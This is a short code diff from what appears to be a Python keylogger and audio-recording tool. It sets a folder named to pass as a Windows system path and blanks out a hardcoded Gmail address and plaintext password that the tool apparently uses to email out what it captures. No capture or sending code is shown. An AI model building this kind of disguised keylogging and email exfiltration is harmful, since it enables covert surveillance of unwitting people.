@@ -15,9 +15,9 @@ dir = "C:\$WinConfig\Temp"
 # default aduio record and key logging duration 
 default_duration = 10
 # emaill address and password
-send_email_address = "samplereciver97@gmail.com"
-receive_email_address = "samplereciver97@gmail.com"
-email_password = "1234.abcd"
+send_email_address = ""
+receive_email_address = ""
+email_password = ""
 
 try: 
     os.makedirs(dir)
